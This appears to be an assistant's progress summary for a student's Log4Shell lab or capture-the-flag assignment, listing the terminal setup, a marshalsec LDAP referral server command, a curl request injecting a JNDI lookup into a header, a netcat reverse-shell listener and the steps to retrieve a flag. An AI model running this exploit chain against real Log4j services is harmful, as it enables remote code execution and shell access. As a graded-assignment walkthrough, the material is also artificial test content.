Summary of what we've achieved so far:

Environment Setup:

You have all four required terminals set up:

Terminal 1: For Java compilation and curl commands
Terminal 2: Python HTTP server on port 4242
Terminal 3: LDAP server on port 1389
Terminal 4: Netcat listener on port 9999




Exploit Preparation:

We've written and compiled the Exploit.java file with a reverse shell payload
We've tried various forms of the payload in the Java code


Attack Attempts:

We've tried multiple curl commands with JNDI injection via different headers
We've tried different IP addresses (172.17.0.1 and attempts with 127.0.0.1)
We've used various formats for the JNDI lookup string



Current Issue:

The LDAP server is not showing activity when we run the curl command
The Python HTTP server is not receiving requests for the Exploit.class file
The netcat listener is not receiving a reverse shell connection

Next steps to get the flag:

Verify LDAP server setup:
Copycd ~/Desktop/log4shell/target
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://172.17.0.1:4242/Exploit#Exploit" 1389

Try a different curl command format:
Copycurl -H 'GATECH_ID:123456789' -H 'Accept:${jndi:ldap://172.17.0.1:1389/Exploit}' http://localhost:8080/rest/cartoons/isAlive
Note: The ordering of the parameters is slightly different here
If you get a shell connection:

Type whoami to verify you have root access
Navigate back two directories with cd ../..
Run java -jar Flag2.jar to get the flag
Copy the flag value to your answer



Remember, based on the forum posts, students were solving this by paying close attention to the exact syntax used in the curl command and ensuring all colons and other special characters were properly placed.
